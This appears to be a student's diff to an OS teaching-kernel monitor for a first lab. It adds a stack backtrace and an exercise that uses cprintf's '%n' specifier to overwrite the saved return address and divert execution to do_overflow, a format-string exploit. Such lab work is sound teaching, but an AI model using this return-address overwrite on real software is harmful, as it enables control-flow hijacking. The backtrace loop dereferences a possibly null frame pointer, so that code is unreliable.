@@ -57,10 +57,86 @@ mon_kerninfo(int argc, char **argv, struct Trapframe *tf)
 	return 0;
 }
 
+// Lab1 only
+// read the pointer to the retaddr on the stack
+static uint32_t
+read_pretaddr() {
+    uint32_t pretaddr;
+    __asm __volatile("leal 4(%%ebp), %0" : "=r" (pretaddr)); 
+    return pretaddr;
+}
+
+void
+do_overflow(void)
+{
+    cprintf("Overflow success\n");
+}
+
+#define get_byte(addr, off) ((addr >> (off * 8)) & 0xff)
+
+void
+start_overflow(void)
+{
+	// You should use a techique similar to buffer overflow
+	// to invoke the do_overflow function and
+	// the procedure must return normally.
+
+    // And you must use the "cprintf" function with %n specifier
+    // you augmented in the "Exercise 9" to do this job.
+
+    // hint: You can use the read_pretaddr function to retrieve 
+    //       the pointer to the function call return address;
+
+    char str[256] = {};
+    int nstr = 0;
+    char *pret_addr;
+
+	// Your code here.
+	pret_addr = (char *) read_pretaddr();
+	uint32_t fret_addr = (uint32_t) do_overflow;
+
+
+	for (nstr = 0; nstr < get_byte(fret_addr, 0) + 3; nstr++) str[nstr] = '.';
+	str[nstr - 1] = '\0';
+	cprintf("%s%n", str, pret_addr);
+
+	for (nstr = 0; nstr < get_byte(fret_addr, 1); nstr++) str[nstr] = '.';
+	str[nstr - 1] = '\0';
+	cprintf("%s%n", str, pret_addr+1);	
+}
+
+void
+overflow_me(void)
+{
+    start_overflow();
+}
+
 int
 mon_backtrace(int argc, char **argv, struct Trapframe *tf)
 {
 	// Your code here.
+	cprintf("Stack backtrace:\n");
+    int eip = read_eip();
+	int *ebp = (int *)read_ebp();
+	int args[5] = {*(ebp + 2), *(ebp + 3), 
+				   *(ebp + 4), *(ebp + 5), *(ebp + 6)};
+	struct Eipdebuginfo info;
+	debuginfo_eip((uintptr_t)eip, &info);
+	while (ebp) {
+		cprintf("eip %x ebp %x args %08x %08x %08x %08x %08x\n%s:%d: %s+%d\n", 
+				 eip, ebp, args[0], args[1], args[2], args[3], args[4], 
+				 info.eip_file, info.eip_line, info.eip_fn_name, (int)info.eip_fn_addr);
+		ebp = (int *)(*ebp);
+		eip = *(ebp + 1);
+		args[0] = *(ebp + 2);
+		args[1] = *(ebp + 3);
+		args[2] = *(ebp + 4);
+		args[3] = *(ebp + 5);
+		args[4] = *(ebp + 6);
+		debuginfo_eip((uintptr_t)eip, &info);
+	}
+    cprintf("Backtrace success\n");
+	overflow_me();
 	return 0;
 }
 
